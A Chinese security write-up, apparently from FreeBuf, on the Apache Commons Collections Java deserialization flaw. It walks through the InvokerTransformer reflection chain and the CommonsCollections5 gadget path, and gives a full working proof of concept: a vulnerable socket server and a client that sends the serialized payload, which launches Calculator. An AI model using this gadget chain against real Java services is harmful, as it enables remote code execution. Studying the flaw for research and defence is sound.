***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 0x00 CommonsCollections

[上篇文章](http://www.freebuf.com/column/174784.html)讲到了Spring-tx组件出现的问题，通过构造RMI和JNDI来供服务端下载恶意class并通过反序列化进行RCE，这次研究一下另外一种漏洞，利用Java的反射机制来执行任意命令，并且通过反序列化来进行RCE。本次分析的漏洞则是2015年出现的Apache-commons-collections组件出现的反序列化问题，这个包为Java提供了很多基础常用且强大的数据结构，方便开发。

## 0x01 TransformedMap

看网上的大佬们说这次出现的问题是由于TransformedMap和InvokerTransformer造成的。

`TransformedMap`这个类是用来对`Map`进行某些变换用的，例如当我们修改`Map`中的某个值时，就会触发我们预先定义好的某些操作来对`Map`进行处理。

    
    
    Map transformedMap = TransformedMap.decorate(map, keyTransformer, valueTransformer);  
    

通过`decorate`函数就可以将一个普通的`Map`转换为一个`TransformedMap`。第二个参数和第三个参数分别对应当`key`改变和`value`改变时需要做的操作；`Transformer`是一个接口，实现`transform(Object
input)`方法即可进行实际的变换操作，按照如上代码生成`transformedMap`后，如果修改了其中的任意`key`或`value`，都会调用对应的`transform`方法去进行一些变换操作。

如果想要进行一系列的变换操作，可以通过定义一个`ChainedTransformer`来实现，只需要传入一个`Transformer`数组即可：

    
    
    Transformer[] transformers = new Transformer[] {  
    new ConstantTransformer(...),  
    new InvokerTransformer(...)  
    };  
      
    Transformer chainedTransformer = new ChainedTransformer(transformers);  
    Map transMap = TransformedMap.decorate(rawMap, null, chainedTransformer);  
    

`CommonsCollections`也已经内置了许多常见的`transformer`，无需手工编写，其中有一个`InvokerTransformer`十分有趣，可以通过反射的方式去调用任意的函数，也是我们执行命令的关键。

## 0x02 Run exec

在Java中执行命令一般通过`Runtime.getRuntime().exec("command")`来执行命令，如果我们想在修改`transformedMap`时执行命令，就需要构造一个特殊的`ChainedTransformer`来反射出exec函数。

在构造之前，我们要先看一下`ChainedTransformer`和`InvokerTransformer`是如何工作的，下面的代码会触发`chainedTransformer`开始进行变换：

    
    
    Map normalMap = new HashMap();  
    normalMap.put("foo", "bar");  
      
    Map transformMap = TransformedMap.decorate(normalMap, transformChain, transformChain);  
      
    Map.Entry entry = (Map.Entry) transformMap.entrySet().iterator().next();  
    entry.setValue("test");  
    

最终会调用到`org/apache/commons/collections/functors/ChainedTransformer.class`中的`transform`方法。

![640.jpeg](https://image.3001.net/images/20180620/15294792305451.jpeg!small)

可以看到这个链中，会将上一次变换的结果作为下一次变换的输入，直到所有的变换完成，并返回最终的`object`，很容易理解，就不过多赘述了。

下面来看下InvokerTransformer的关键代码：  

![640-2.jpeg](https://image.3001.net/images/20180620/15294792475592.jpeg!small)关键部分在于通过getClass()、getMethod、
invoke()来进行反射，查找并调用给定的方法。  

在我们构造的`chain`中，最终实现的应当是执行类似于

    
    
    ((Runtime) Runtime.class.getMethod("getRuntime").invoke()).exec("ifconfig")

这样的代码，所以`chain`的第一步就是获取`Runtime`类，可以通过内置的`ConstantTransformer`来获取，所以`chain`现在是这个样子：

    
    
    Transformer[] transformers = new Transformer[] {  
    new ConstantTransformer(Runtime.class)  
    };  
      
    Transformer transformChain = new ChainedTransformer(transformers);  
    

接下来就是通过`InvokerTransformer`来反射调用`getMethod`方法，参数是`getRuntime`，以此来获取到`Runtime.getRuntime`。`InvokerTransformer`接受三个参数，分别是调用方法的名称，参数类型，调用参数。所以第一个参数就应当为`getMethod`；而`getMethod`方法的签名为`getMethod(String,
Class...)`，我们实际用的时候也只传入了一个String，所以第二个参数应当写为`new Class[] {String.class,
Class[].class}`，第三个参数则为调用`getMethod`时候实际传入的参数，所以应当为`new Object[]
{"getRuntime", new Class[0]}`就可以了。

到这里`chain`已经是这个样子了：

    
    
    Transformer[] transformers = new Transformer[] {  
    new ConstantTransformer(Runtime.class),  
    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]})  
    };  
      
    Transformer transformChain = new ChainedTransformer(transformers);  
    

紧接着我们按照同样的方法构造出调用`invoke`和`exec`的`InvokerTransformer`，整个`chain`就完成了。

    
    
    Transformer[] transformers = new Transformer[] {  
    new ConstantTransformer(Runtime.class),  
    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}),  
    new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}),  
    new InvokerTransformer("exec", new Class[] {String.class}, new Object[] {"open -a Calculator"})  
    };  
      
    Transformer transformChain = new ChainedTransformer(transformers);  
    

我们只要构造一个使用此`chain`的`TransformedMap`，就可以执行命令了，可以通过下面的代码来进行测试：

    
    
    // 创建普通的Map  
    Map normalMap = new HashMap();  
    normalMap.put("foo", "bar");  
      
    // 将普通的Map变成TransformedMap，并且指定变换方式为前面定义的恶意chain  
    Map transformMap = TransformedMap.decorate(normalMap, transformChain, transformChain);  
      
    // 尝试修改TransformedMap中的一个值，成功执行命令  
    Map.Entry entry = (Map.Entry) transformMap.entrySet().iterator().next();  
    entry.setValue("test");  
    

执行结果如下：  

![640-3.jpeg](https://image.3001.net/images/20180620/15294793795362.jpeg!small)

## 0x03 RCE?

到目前为止，我们已经构造出了可以执行命令的恶意chain，姑且称之为pocChain。现在只要找到一个符合以下条件的类，并且服务端有反序列化的入口，就可以RCE了：

1\. 该类重写了`readObject`方法；

2\. 该类在`readObject`方法中操作了我们序列化后实现了`pocChain`的`TransformedMap`；

看了网上很多的文章，均提到了AnnotationInvocationHandler类，其中有一个变量memberValues是Map类型，并且这个变量可以在构造函数中设置，除此之外，还在readObject方法中对memberValues中的每一项调用了setValues方法。一切简直完美，完全符合刚才说到的条件，但是在我实际的调试中发现，为什么不弹计算器，为什么AnnotationInvocationHandler的代码和大佬们的代码不一样，附上我这里的代码：  
![640-4.jpeg](https://image.3001.net/images/20180620/15294794322751.jpeg!small)![640-5.jpeg](https://image.3001.net/images/20180620/15294794448544.jpeg!small)  

多篇文章中提到的`setValues`方法失踪了，搜了很多篇资料后，具体原因还是不太清楚，姑且认为是`JDK1.8`的原因吧，所以我们需要找一个其他的类来完成我们的调用链；后来在网上找到了ysoserial这个项目，惊喜的发现其中的`CommonsCollections5`这个payload可以完美运行，于是对着这个poc疯狂调试，终于找到了一个调用链。

## 0x04 RCE!

`CommonsCollections5`中利用的是`BadAttributeValueExpException`这个类，不妨先看下这个类的代码：

    
    
    package javax.management;  
      
    import java.io.IOException;  
    import java.io.ObjectInputStream;  
      
    public class BadAttributeValueExpException extends Exception   {  
    /* Serial version */  
    private static final long serialVersionUID = -3105272988410493376L;  
      
    /**  
         * @serial A string representation of the attribute that originated this exception.  
         * for example, the string value can be the return of {@code attribute.toString()}  
         */  
    private Object val;  
      
    /**  
         * Constructs a BadAttributeValueExpException using the specified Object to  
         * create the toString() value.  
         *  
         * @param val the inappropriate value.  
         */  
    public BadAttributeValueExpException (Object val) {  
    this.val = val == null ? null : val.toString();  
    }  
      
      
    /**  
         * Returns the string representing the object.  
         */  
    public String toString()  {  
    return "BadAttributeValueException: " + val;  
    }  
      
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {  
    ObjectInputStream.GetField gf = ois.readFields();  
    Object valObj = gf.get("val", null);  
      
    if (valObj == null) {  
    val = null;  
    } else if (valObj instanceof String) {  
    val= valObj;  
    } else if (System.getSecurityManager() == null  
    || valObj instanceof Long  
    || valObj instanceof Integer  
    || valObj instanceof Float  
    || valObj instanceof Double  
    || valObj instanceof Byte  
    || valObj instanceof Short  
    || valObj instanceof Boolean) {  
    val = valObj.toString();  
    } else { // the serialized object is from a version without JDK-8019292 fix  
    val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();}}}

通读一下代码，非常简单，其中有一个私有变量`val`，而且重写了`readObject`方法，如果我们通过序列化传入的`val`是个LazyMap，那么在其中调用`valObj.toString()`的时候会去调用`LazyMap.get()`中的`transform`函数。

梳理一下到目前为止的思路：

    
    
    构造一个BadAttributeValueException对象exception ->  
    exception的val变量设置为LazyMap的entry ->  
    调用entry的toString将其转为字符串 ->  
    调用LazyMap的get方法获取一个不存在的key ->  
    调用transform方法执行命令  
    

转换成调用链就是：

    
    
    BadAttributeValueException.readObject ->  
        TiedMapEntry.toString ->  
            LazyMap.get ->  
                ChainedTransformer.transform

所以我们先来构造一下恶意的Map:

    
    
    Map innerMap = new HashMap();  
    innerMap.put("foo", "bar");  
    Map lazyMap = LazyMap.decorate(innerMap, transformChain);  
    lazyMap.get("foo233");  
    

这里传入了一个不存在的键`foo233`，当调用entry.getValue()去尝试获取这个不存在的键对应的值时，会通过transformChain来创建对应的值并且放到Map中。但是我们不能这么写，需要通过类似『延迟计算』的特性，让其在序列化以后并且在toString的时候再去获取不存在的键以触发payload。所以这里引入了另外的一个类`TiedMapEntry`，他和普通的entry比较类似，但是可以将一个键和entry进行绑定，在需要的时候直接调用getValue()方法即可；

    
    
    Map innerMap = new HashMap();  
    innerMap.put("foo", "bar");  
    Map lazyMap = LazyMap.decorate(innerMap, transformChain);  
    TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo233");  
    

接下来的工作就是构造一个`BadAttributeValueExpException`对象并序列化，这里有个骚操作，就是如何给私有的变量赋值。

    
    
    BadAttributeValueExpException exception = new BadAttributeValueExpException(null);  
    Field valField = exception.getClass().getDeclaredField("val");  
    valField.setAccessible(true);  
    valField.set(exception, entry);  
    

`exception`就是我们最终构造好的对象，将其序列化后存入文件，读取出来并反序列化的时候就会执行命令。除了这一条调用链外，还有很多其他的调用链可以使用，包括`CommonsCollections3`和`CommonsCollections6`，感兴趣的同学可以自己调试一下PoC，但是这里有个坑。

我调试的时候使用的是IDEA，在调试模式下，IDE会不断的计算每个变量的值，正是因为这个特性，IDE会『帮』我们提前执行PoC，从而导致在没有走到漏洞触发点的时候就已经弹计算器了，所以在调试的时候要格外细心，防止走错路。  

![640-6.jpeg](https://image.3001.net/images/20180620/15294795141038.jpeg!small)

## 0x05 DEMO

    
    
    // filename: Server.java  
    package me.lightless;  
      
    import java.io.ObjectInputStream;  
    import java.net.ServerSocket;  
    import java.net.Socket;  
      
    public class Server {  
    public static void main(String[] args) {  
    try {  
    ServerSocket serverSocket = new ServerSocket(9999);  
    System.out.println("Server started on port " + serverSocket.getLocalPort());  
    while (true) {  
    Socket socket = serverSocket.accept();  
    System.out.println("Connection received from " + socket.getInetAddress());  
    ObjectInputStream objectInputStream = new ObjectInputStream(socket.getInputStream());  
    try {  
    Object object = objectInputStream.readObject();  
    System.out.println("Read object " + object);  
    } catch (Exception e) {  
    System.out.println("Exception caught while reading object");  
    e.printStackTrace();  
    }  
    }  
    } catch (Exception e) {  
    e.printStackTrace();  
    }  
    }  
    }  
    
    
    
    // filename: POC.java  
    package me.lightless;  
      
    import org.apache.commons.collections.Transformer;  
    import org.apache.commons.collections.functors.ChainedTransformer;  
    import org.apache.commons.collections.functors.ConstantTransformer;  
    import org.apache.commons.collections.functors.InvokerTransformer;  
    import org.apache.commons.collections.keyvalue.TiedMapEntry;  
    import org.apache.commons.collections.map.LazyMap;  
      
    import javax.management.BadAttributeValueExpException;  
    import java.io.FileInputStream;  
    import java.io.ObjectInputStream;  
    import java.io.ObjectOutputStream;  
    import java.lang.reflect.Field;  
    import java.net.Socket;  
    import java.util.HashMap;  
    import java.util.Map;  
      
    public class POC {  
    public static void main(String[] args) throws Exception {  
    //        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("payload.bin"));  
    //        objectInputStream.readObject();  
    //        objectInputStream.close();  
      
    Transformer[] transformers = new Transformer[] {  
    new ConstantTransformer(Runtime.class),  
    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class}, new Object[] {"getRuntime", new Class[0]}),  
    new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]}),  
    new InvokerTransformer("exec", new Class[] {String.class}, new Object[] {"open -a Calculator"}),  
    new ConstantTransformer("1")  
    };  
    Transformer transformChain = new ChainedTransformer(transformers);  
      
    Map innerMap = new HashMap();  
    Map lazyMap = LazyMap.decorate(innerMap, transformChain);  
    TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo233");  
      
    BadAttributeValueExpException exception = new BadAttributeValueExpException(null);Field valField = exception.getClass().getDeclaredField("val");//        System.out.println("val field: " + valField);valField.setAccessible(true);valField.set(exception, entry);Socket socket=new Socket("127.0.0.1", 9999);ObjectOutputStream objectOutputStream = new ObjectOutputStream(socket.getOutputStream());objectOutputStream.writeObject(exception);objectOutputStream.flush();}}

## 0xff 参考文献

1\. <https://security.tencent.com/index.php/blog/msg/97>

2\. <https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/>

3\. <https://github.com/frohoff/ysoserial>

*** 本文作者：美丽联合安全MLSRC，转载请注明来自FreeBuf.COM**

